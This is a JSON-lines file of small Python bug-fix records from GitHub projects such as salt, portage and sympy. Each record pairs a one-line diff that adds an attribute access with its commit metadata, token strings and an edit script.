{"project": "millegrilles.consignation.python", "commit_sha": "108d56c416615ef3c21caa493b5c2835aa5355c9", "parent_sha": "5ba7c3a63442a43b3d9ff5ac7582fcaa493a21fc", "file_path": "millegrilles/dao/DocumentDAO.py", "project_url": "https://github.com/dugrema/millegrilles.consignation.python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class MongoDAO:\n         logging.debug(\"Verify if connection established\")\n         self._client.admin.command('ismaster')\n \n-        logging.info(\"Connection etablie, ouverture base de donnes %s\" % self.nom_millegrille)\n+        logging.info(\"Connection etablie, ouverture base de donnes %s\" % self._configuration.nom_millegrille)\n \n         self._mg_database = self._client[self._nom_millegrille]\n         self._collection_transactions = self._mg_database[Constantes.DOCUMENT_COLLECTION_TRANSACTIONS]\n", "before": "logging . info ( \"Connection etablie, ouverture base de donnes %s\" % self . nom_millegrille )", "after": "logging . info ( \"Connection etablie, ouverture base de donnes %s\" % self . _configuration . nom_millegrille )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 74, 3, 94], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 74, 3, 94], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 74, 3, 78], 0], [\"Move\", \"N0\", [\".:.\", 3, 78, 3, 79], 1], [\"Insert\", \"N0\", [\"identifier:_configuration\", \"T\"], 2]]"}
{"project": "datasets", "commit_sha": "db1874037b8c4acb25b4aaa4039d6121c34405f0", "parent_sha": "10aae8a56e2e2c6d97a7abd1ab6388ac23f8919e", "file_path": "tensorflow_datasets/audio/commonvoice.py", "project_url": "https://github.com/jason-zl190/datasets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class CommonVoice(tfds.core.GeneratorBasedBuilder):\n-        with tf.gfile.GFile(label_path) as file_:\n+        with tf.io.gfile.GFile(label_path) as file_:\n             dataset = csv.DictReader(file_, delimiter=\"\\t\")\n             ffmpeg = tfds.features.Audio(file_format=\"mp3\")\n             for row in dataset:\n", "before": "with tf . gfile . GFile ( label_path ) as file_ : dataset = csv . DictReader ( file_ , delimiter = \"\\t\" ) ffmpeg = tfds . features . Audio ( file_format = \"mp3\" ) for row in dataset : ", "after": "with tf . io . gfile . GFile ( label_path ) as file_ : dataset = csv . DictReader ( file_ , delimiter = \"\\t\" ) ffmpeg = tfds . features . Audio ( file_format = \"mp3\" ) for row in dataset : ", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 0, 14, 0, 22], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 0, 14, 0, 22], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:tf\", 0, 14, 0, 16], 0], [\"Move\", \"N0\", [\".:.\", 0, 16, 0, 17], 1], [\"Insert\", \"N0\", [\"identifier:io\", \"T\"], 2]]"}
{"project": "plugin-EventGhost", "commit_sha": "0264373f6244225f38fa6d8ef46602c4fc405d60", "parent_sha": "9998343da0c88b946cad64ea4fc910ccd7ed64d2", "file_path": "PythonScript.py", "project_url": "https://github.com/ProjectEG/plugin-EventGhost", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class PythonScript(eg.ActionBase):\n         panel = eg.ConfigPanel(resizable=True)\r\n         editCtrl = eg.PythonEditorCtrl(panel, value=sourceCode)\r\n         panel.sizer.Add(editCtrl, 1, wx.EXPAND)\r\n-        panel.FinishSetup()\r\n+        panel.dialog.FinishSetup()\r\n         panel.dialog.SetPosition(Config.position)\r\n         panel.dialog.SetSize(Config.size)\r\n         while panel.Affirmed():\r\n", "before": "panel . FinishSetup ( )", "after": "panel . dialog . FinishSetup ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 9, 3, 26], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 26], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:panel\", 3, 9, 3, 14], 0], [\"Move\", \"N0\", [\".:.\", 3, 14, 3, 15], 1], [\"Insert\", \"N0\", [\"identifier:dialog\", \"T\"], 2]]"}
{"project": "folia", "commit_sha": "38630d808688d72faf2e825c10607c48a58fff7a", "parent_sha": "51acebe4950c9286935b113ada93145bad81c8f5", "file_path": "foliatools/foliaquery.py", "project_url": "https://github.com/MeTavi/folia", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def process(filename, queries):\n                 query.format = \"xml\"\n             output = query(doc)\n             print(output)\n-            if query.action and query.action in ('EDIT','DELETE','SUBSTITUTE','PREPEND','APPEND'):\n+            if query.action and query.action.action in ('EDIT','DELETE','SUBSTITUTE','PREPEND','APPEND'):\n                 dosave = True\n         #save document if changes are made\n         if dosave:\n", "before": "if query . action and query . action in ( 'EDIT' , 'DELETE' , 'SUBSTITUTE' , 'PREPEND' , 'APPEND' ) : dosave = True", "after": "if query . action and query . action . action in ( 'EDIT' , 'DELETE' , 'SUBSTITUTE' , 'PREPEND' , 'APPEND' ) : dosave = True", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 33, 3, 45], [\"attribute\", 3, 33, 3, 45], 0], [\"Insert\", [\"attribute\", 3, 33, 3, 45], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 33, 3, 45], [\"identifier:action\", \"T\"], 2]]"}
{"project": "gecco", "commit_sha": "cddde0ccd124eb3eb4df6f2eea60116de9119fcb", "parent_sha": "baa4df38907dbad9fb0a2504a4cdfb510e4dd8c8", "file_path": "gecco/gecco.py", "project_url": "https://github.com/MeTavi/gecco", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ class DataThread(Process):\n                 else:\n                     outputtextfile = inputtextfile + '.folia.xml'\n \n-                tokenizer = Tokenizer(self.settings['ucto'],xmloutput=True)\n+                tokenizer = Tokenizer(self.corrector.settings['ucto'],xmloutput=True)\n                 tokenizer.tokenize(inputtextfile, outputtextfile)\n \n                 foliadoc = outputtextfile\n", "before": "tokenizer = Tokenizer ( self . settings [ 'ucto' ] , xmloutput = True )", "after": "tokenizer = Tokenizer ( self . corrector . settings [ 'ucto' ] , xmloutput = True )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 39, 3, 52], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 39, 3, 52], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 39, 3, 43], 0], [\"Move\", \"N0\", [\".:.\", 3, 43, 3, 44], 1], [\"Insert\", \"N0\", [\"identifier:corrector\", \"T\"], 2]]"}
{"project": "gecco", "commit_sha": "e5f340a52899566ed703b051bd54588edb8be017", "parent_sha": "ea50f084a934e67795c4a9598b0f3587c0334dcd", "file_path": "gecco/gecco.py", "project_url": "https://github.com/MeTavi/gecco", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ class DataThread(Process):\n                 module.init(self.foliadoc)\n \n         #data in inputqueue takes the form (module, data), where data is an instance of module.UNIT (a folia document or element)\n-        if folia.Document in self.units:\n+        if folia.Document in self.corrector.units:\n             self.corrector.log(\"\\tPreparing input of full documents\")\n \n             for module in self.corrector:\n", "before": "if folia . Document in self . units : self . corrector . log ( \"\\tPreparing input of full documents\" ) for module in self . corrector : ", "after": "if folia . Document in self . corrector . units : self . corrector . log ( \"\\tPreparing input of full documents\" ) for module in self . corrector : ", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 30, 3, 40], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 30, 3, 40], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 30, 3, 34], 0], [\"Move\", \"N0\", [\".:.\", 3, 34, 3, 35], 1], [\"Insert\", \"N0\", [\"identifier:corrector\", \"T\"], 2]]"}
{"project": "oct2py", "commit_sha": "f44fd47b64e8aa5a151844c90ab3681dda4e1731", "parent_sha": "986b629d44372216bf4de8c92d31a0cb58519b2a", "file_path": "oct2py/_matwrite.py", "project_url": "https://github.com/TestingCI/oct2py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ class MatWrite(object):\n             data = data.astype(np.object)\r\n         elif '<c' in dstr and np.alltrue(data.imag == 0):\r\n             data.imag = 1e-9\r\n-        if data.dtype in ['float128', 'complex256']:\r\n+        if data.dtype.name in ['float128', 'complex256']:\r\n             raise Oct2PyError('Datatype not supported: {0}'.format(data.dtype))\r\n         if data.dtype == 'object' and len(data.shape) > 1:\r\n             data = data.T\r\n", "before": "if data . dtype in [ 'float128' , 'complex256' ] : raise Oct2PyError ( 'Datatype not supported: {0}' . format ( data . dtype ) )", "after": "if data . dtype . name in [ 'float128' , 'complex256' ] : raise Oct2PyError ( 'Datatype not supported: {0}' . format ( data . dtype ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 12, 3, 22], [\"attribute\", 3, 12, 3, 22], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 22], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 12, 3, 22], [\"identifier:name\", \"T\"], 2]]"}
{"project": "sympy", "commit_sha": "9ff9104dec68c15a5ade3fa365eebf7434f7ef91", "parent_sha": "0af063ef397fa9f44eca6d9f4bf0acefa9e15ee8", "file_path": "sympy/polys/distributedmodules.py", "project_url": "https://github.com/TestingCI/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -292,7 +292,7 @@ def sdm_from_vector(vec, O, K, **opts):\n     dic = {}\n     for i, d in enumerate(dics):\n         for k, v in d.iteritems():\n-            dic[(i,) + k] = K(v)\n+            dic[(i,) + k] = K.convert(v)\n     return sdm_from_dict(dic, O)\n \n def sdm_to_vector(f, gens, K, n=None):\n", "before": "dic [ ( i , ) + k ] = K ( v )", "after": "dic [ ( i , ) + k ] = K . convert ( v )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 29, 3, 33], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:K\", 3, 29, 3, 30], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:convert\", \"T\"], 2]]"}
{"project": "django-pagination", "commit_sha": "184a0afb64cc0bb105abea431bdbc8a5f1b0999c", "parent_sha": "c565d4651fa795631819d92a125bb4a44572f368", "file_path": "pagination/middleware.py", "project_url": "https://github.com/quinode/django-pagination", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -5,6 +5,6 @@ class PaginationMiddleware(object):\n     def process_request(self, request):\n         try:\n-            request.page = int(request['page'])\n+            request.page = int(request.REQUEST['page'])\n         except (KeyError, ValueError):\n             request.page = 1\n\\ No newline at end of file\n", "before": "request . page = int ( request [ 'page' ] )", "after": "request . page = int ( request . REQUEST [ 'page' ] )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 2, 32, 2, 47], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:request\", 2, 32, 2, 39], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:REQUEST\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "201008b35d799bee5c33e4060241a21e08661def", "parent_sha": "5f494c3c2aea18590613214a24d63368ee4afe98", "file_path": "salt/cloud/clouds/libcloud_aws.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -528,7 +528,7 @@ def create(vm_):\n         else:\n             log.error('Failed to start Salt on Cloud VM {name}'.format(**vm_))\n \n-    ret.update(data)\n+    ret.update(data.__dict__)\n \n     log.info('Created Cloud VM {0[name]!r}'.format(vm_))\n     log.debug(\n", "before": "ret . update ( data )", "after": "ret . update ( data . __dict__ )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 15, 3, 21], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:data\", 3, 16, 3, 20], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:__dict__\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "a8162f64add44cace0a1a2dd744256a227824882", "parent_sha": "02fc2d091df18c4606a50cfbd0c64c59e4715cfe", "file_path": "salt/utils/raetevent.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -254,4 +254,4 @@ class RunnerEvent(RAETEvent):\n     def fire_progress(self, data, outputter='pprint'):\n         progress_event = {'data': data,\n                           'outputter': outputter}\n-        self.fire_event(progress_event, salt.utils.tagify([self.jid, 'progress'], 'runner'))\n+        self.fire_event(progress_event, salt.utils.event.tagify([self.jid, 'progress'], 'runner'))\n", "before": "self . fire_event ( progress_event , salt . utils . tagify ( [ self . jid , 'progress' ] , 'runner' ) )", "after": "self . fire_event ( progress_event , salt . utils . event . tagify ( [ self . jid , 'progress' ] , 'runner' ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 41, 3, 51], [\"attribute\", 3, 41, 3, 51], 0], [\"Insert\", [\"attribute\", 3, 41, 3, 51], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 41, 3, 51], [\"identifier:event\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "7998d914caff01c5e5b90d96721c0c1742e61858", "parent_sha": "1a4b13ea8bb33340bb0b83721dd006388fdebb43", "file_path": "salt/key.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -281,7 +281,7 @@ class KeyCLI(object):\n         if self.opts['gen_keys']:\n-            self.gen_keys()\n+            self.key.gen_keys()\n             return\n         if self.opts['list']:\n             self.list_status(self.opts['list'])\n", "before": "self . gen_keys ( )", "after": "self . key . gen_keys ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 1, 13, 1, 26], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 1, 13, 1, 26], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 1, 13, 1, 17], 0], [\"Move\", \"N0\", [\".:.\", 1, 17, 1, 18], 1], [\"Insert\", \"N0\", [\"identifier:key\", \"T\"], 2]]"}
{"project": "price-probe-ml", "commit_sha": "88589d919096b882331c82b7cd15fc0b75d7b3c4", "parent_sha": "9a1c1d534230c78c4570ba8bd3854edeacfad1c6", "file_path": "spark/spark.py", "project_url": "https://github.com/AndreaM16/price-probe-ml", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ def init_tables(sc, url):\n     item.set_item_table(sc, url)\n     price.set_price_table(sc, url)\n     category.Category.set_category_item_table(sc, url)\n-    currency.set_currency_table(sc, url)\n+    currency.Currency.set_currency_table(sc, url)\n     manufacturer.set_manufacturer_table(sc, url)\n     review.set_review_table(sc, url)\n     trend.set_trend_table(sc, url)\n", "before": "currency . set_currency_table ( sc , url )", "after": "currency . Currency . set_currency_table ( sc , url )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 5, 3, 32], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 5, 3, 32], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:currency\", 3, 5, 3, 13], 0], [\"Move\", \"N0\", [\".:.\", 3, 13, 3, 14], 1], [\"Insert\", \"N0\", [\"identifier:Currency\", \"T\"], 2]]"}
{"project": "cms", "commit_sha": "c1f3c97a7ede2e2c967edb21f7c128efa464181a", "parent_sha": "667163e84be9c803a114e977e146701acf6eac02", "file_path": "cmscontrib/AddSubmission.py", "project_url": "https://github.com/igortereshchenko/cms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ def add_submission(contest_id, username, task_name, timestamp, files):\n             return False\n \n         # Create objects in the DB.\n-        submission = Submission(make_datetime(timestamp), language,\n+        submission = Submission(make_datetime(timestamp), language.name,\n                                 participation=participation, task=task)\n         for filename, digest in file_digests.items():\n             session.add(File(filename, digest, submission=submission))\n", "before": "submission = Submission ( make_datetime ( timestamp ) , language , participation = participation , task = task )", "after": "submission = Submission ( make_datetime ( timestamp ) , language . name , participation = participation , task = task )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 4, 72], [\"attribute\", \"N0\"], 3], [\"Move\", \"N0\", [\"identifier:language\", 3, 59, 3, 67], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "Alfred", "commit_sha": "6ca7bb2b53fc0c8f3c4a84eadb13ba5dd5045fd2", "parent_sha": "99fc55e1670c654f1f10156dbaffc3ff0a942882", "file_path": "plugins/entertainment/chromecast.py", "project_url": "https://github.com/UStack/Alfred", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class ChromecastStatusSubscriber:\n         logging.info('Cast \"%s\" status updated (%s)' % (self._cast_name, str(new_status)))\n \n         if self._trigger is not None:\n-            self._trigger(new_status)\n+            self._trigger(new_status.__dict__)\n \n \n class ChromecastDevice(PluginBase):\n", "before": "self . _trigger ( new_status )", "after": "self . _trigger ( new_status . __dict__ )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 38], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:new_status\", 3, 27, 3, 37], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:__dict__\", \"T\"], 2]]"}
{"project": "ipython", "commit_sha": "88bc745df6c262f906a085057f0177c60f74d287", "parent_sha": "1d1c99b7735fe19b044ae04300b40d665dd1f04b", "file_path": "IPython/lib/inputhook.py", "project_url": "https://github.com/astriker/ipython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -363,7 +363,7 @@ def enable(self, app=None):\n         from IPython.lib.inputhookqt4 import create_inputhook_qt4\n-        app, inputhook_qt4 = create_inputhook_qt4(self, app)\n+        app, inputhook_qt4 = create_inputhook_qt4(self.manager, app)\n         self.manager.set_inputhook(inputhook_qt4)\n         if _use_appnope():\n             from appnope import nope\n", "before": "app , inputhook_qt4 = create_inputhook_qt4 ( self , app )", "after": "app , inputhook_qt4 = create_inputhook_qt4 ( self . manager , app )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 50, 1, 61], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 1, 51, 1, 55], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:manager\", \"T\"], 2]]"}
{"project": "Qcodes", "commit_sha": "ad9ed6635ab5b464bd8fab3ec0af1e386b6bc792", "parent_sha": "e4599c00d8c0085b80a998578c60d2dbca9fc86b", "file_path": "qcodes/instrument_drivers/QuTech/M2j.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ class M2j(Instrument):\n         super().__init__(name, **kwargs)\n \n-        self.m2j = M2j_module(spi_rack, module)\n+        self.m2j = M2j_module.M2j_module(spi_rack, module)\n \n         self.add_parameter('gain',\n                            label='gain',\n", "before": "self . m2j = M2j_module ( spi_rack , module )", "after": "self . m2j = M2j_module . M2j_module ( spi_rack , module )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 2, 20, 2, 48], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:M2j_module\", 2, 20, 2, 30], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:M2j_module\", \"T\"], 2]]"}
{"project": "portage", "commit_sha": "f584253e0d67417108641361354c619970a724c5", "parent_sha": "0f799b2a045dfa74ba011123bf5ea6186f44941d", "file_path": "pym/_emerge/create_world_atom.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def create_world_atom(pkg, args_set, root_config):\n \t\t\tfor cpv in vardb.match(cp))\n \t\tslotted = len(available_slots) > 1 or \\\n \t\t\t(len(available_slots) == 1 and \"0\" not in available_slots)\n-\tif slotted and arg_atom != cp:\n+\tif slotted and arg_atom.without_repo != cp:\n \t\t# If the user gave a specific atom, store it as a\n \t\t# slot atom in the world file.\n \t\tslot_atom = pkg.slot_atom\n", "before": "for cpv in vardb . match ( cp ) ) slotted = len ( available_slots ) > 1 or ( len ( available_slots ) == 1 and \"0\" not in available_slots ) if slotted and arg_atom != cp : slot_atom = pkg . slot_atom", "after": "for cpv in vardb . match ( cp ) ) slotted = len ( available_slots ) > 1 or ( len ( available_slots ) == 1 and \"0\" not in available_slots ) if slotted and arg_atom . without_repo != cp : slot_atom = pkg . slot_atom", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 17, 3, 31], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:arg_atom\", 3, 17, 3, 25], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:without_repo\", \"T\"], 2]]"}
{"project": "portage", "commit_sha": "13e7e7277b50c525c31588e52953b9defbe07e8b", "parent_sha": "b3c018323e9a78b6bccfe5f20f41c40fdd2eb989", "file_path": "pym/portage/dbapi/bintree.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -951,7 +951,7 @@ class binarytree(object):\n \n \t\t\t# Discard cached metadata to ensure that _pkgindex_entry\n \t\t\t# doesn't return stale metadata.\n-\t\t\tself._aux_cache.pop(cpv, None)\n+\t\t\tself.dbapi._aux_cache.pop(cpv, None)\n \n \t\t\ttry:\n \t\t\t\td = self._pkgindex_entry(cpv)\n", "before": "self . _aux_cache . pop ( cpv , None )", "after": "self . dbapi . _aux_cache . pop ( cpv , None )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 4, 3, 19], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 4, 3, 19], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 4, 3, 8], 0], [\"Move\", \"N0\", [\".:.\", 3, 8, 3, 9], 1], [\"Insert\", \"N0\", [\"identifier:dbapi\", \"T\"], 2]]"}
{"project": "ESP-Website-1", "commit_sha": "2c5655487ab8e8bcf5411f89e85160ed3ae71850", "parent_sha": "2ef0cc4f8263d0a1c5513b549ab9d107a9531d54", "file_path": "esp/esp/program/models/class_.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/ESP-Website-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1544,7 +1544,7 @@ class ClassSubject(models.Model):\n                 return 'You are not in the requested grade range for this class.'\n \n         # student has no classes...no conflict there.\n-        if user.getClasses(self.parent_program, verbs=[self.parent_program.getModuleExtension('StudentClassRegModuleInfo').signup_verb]).count() == 0:\n+        if user.getClasses(self.parent_program, verbs=[self.parent_program.getModuleExtension('StudentClassRegModuleInfo').signup_verb.name]).count() == 0:\n             return False\n \n         for section in self.sections.all():\n", "before": "if user . getClasses ( self . parent_program , verbs = [ self . parent_program . getModuleExtension ( 'StudentClassRegModuleInfo' ) . signup_verb ] ) . count ( ) == 0 : return False", "after": "if user . getClasses ( self . parent_program , verbs = [ self . parent_program . getModuleExtension ( 'StudentClassRegModuleInfo' ) . signup_verb . name ] ) . count ( ) == 0 : return False", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 56, 3, 135], [\"attribute\", 3, 56, 3, 135], 0], [\"Insert\", [\"attribute\", 3, 56, 3, 135], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 56, 3, 135], [\"identifier:name\", \"T\"], 2]]"}
{"project": "ESP-Website-1", "commit_sha": "7c5fc1b8ca8f08591f334ffa2013024e89c097de", "parent_sha": "28c6e2897c831366e9df13b6f19bc950c8238232", "file_path": "esp/esp/program/models/class_.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/ESP-Website-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1530,7 +1530,7 @@ class ClassSubject(models.Model):\n                 return 'You are not in the requested grade range for this class.'\n \n         # student has no classes...no conflict there.\n-        if user.getClasses(self.parent_program, verbs=[self.parent_program.getModuleExtension('StudentClassRegModuleInfo').signup_verb]).count() == 0:\n+        if user.getClasses(self.parent_program, verbs=[self.parent_program.getModuleExtension('StudentClassRegModuleInfo').signup_verb.name]).count() == 0:\n             return False\n \n         for section in self.sections.all():\n", "before": "if user . getClasses ( self . parent_program , verbs = [ self . parent_program . getModuleExtension ( 'StudentClassRegModuleInfo' ) . signup_verb ] ) . count ( ) == 0 : return False", "after": "if user . getClasses ( self . parent_program , verbs = [ self . parent_program . getModuleExtension ( 'StudentClassRegModuleInfo' ) . signup_verb . name ] ) . count ( ) == 0 : return False", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 56, 3, 135], [\"attribute\", 3, 56, 3, 135], 0], [\"Insert\", [\"attribute\", 3, 56, 3, 135], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 56, 3, 135], [\"identifier:name\", \"T\"], 2]]"}
{"project": "portage-funtoo", "commit_sha": "79e902e3f6ae9ba1331fc49a6ac7f36be2171f78", "parent_sha": "4323bee2450b6635b2fd3129c15b6060d61a25b6", "file_path": "pym/_emerge/EbuildBuild.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ class EbuildBuild(CompositeTask):\n \t\t\t\tos.path.dirname(self._ebuild_path)))\n \t\t\tportdb = self.pkg.root_config.trees[self._tree].dbapi\n \t\t\tfetch_map = portdb.getFetchMap(self.pkg.cpv,\n-\t\t\t\tuseflags=self.pkg.use, mytree=mytree)\n+\t\t\t\tuseflags=self.pkg.use.enabled, mytree=mytree)\n \t\t\tself.settings.configdict[\"pkg\"][\"A\"] = \" \".join(fetch_map)\n \t\tnofetch_phase = EbuildPhase(background=self.background,\n \t\t\tphase='nofetch', scheduler=self.scheduler, settings=self.settings)\n", "before": "fetch_map = portdb . getFetchMap ( self . pkg . cpv , useflags = self . pkg . use , mytree = mytree )", "after": "fetch_map = portdb . getFetchMap ( self . pkg . cpv , useflags = self . pkg . use . enabled , mytree = mytree )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 14, 3, 26], [\"attribute\", 3, 14, 3, 26], 0], [\"Insert\", [\"attribute\", 3, 14, 3, 26], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 14, 3, 26], [\"identifier:enabled\", \"T\"], 2]]"}
{"project": "portage-funtoo", "commit_sha": "a4b28e981839e14b1bca4c916ed7488aa28ff961", "parent_sha": "75dab994c4a3e7c38ea29cc633706c435991da05", "file_path": "pym/portage/dbapi/vartree.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1100,7 +1100,7 @@ class vartree(object):\n \t\texcept SystemExit as e:\n \t\t\traise\n \t\texcept Exception as e:\n-\t\t\tmydir = os.path.join(self._eroot, VDB_PATH, mycpv)\n+\t\t\tmydir = os.path.join(self.dbapi._eroot, VDB_PATH, mycpv)\n \t\t\twritemsg(_(\"\\nParse Error reading PROVIDE and USE in '%s'\\n\") % mydir,\n \t\t\t\tnoiselevel=-1)\n \t\t\tif mylines:\n", "before": "except Exception as e : mydir = os . path . join ( self . _eroot , VDB_PATH , mycpv )", "after": "except Exception as e : mydir = os . path . join ( self . dbapi . _eroot , VDB_PATH , mycpv )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 25, 3, 36], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 25, 3, 36], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 25, 3, 29], 0], [\"Move\", \"N0\", [\".:.\", 3, 29, 3, 30], 1], [\"Insert\", \"N0\", [\"identifier:dbapi\", \"T\"], 2]]"}
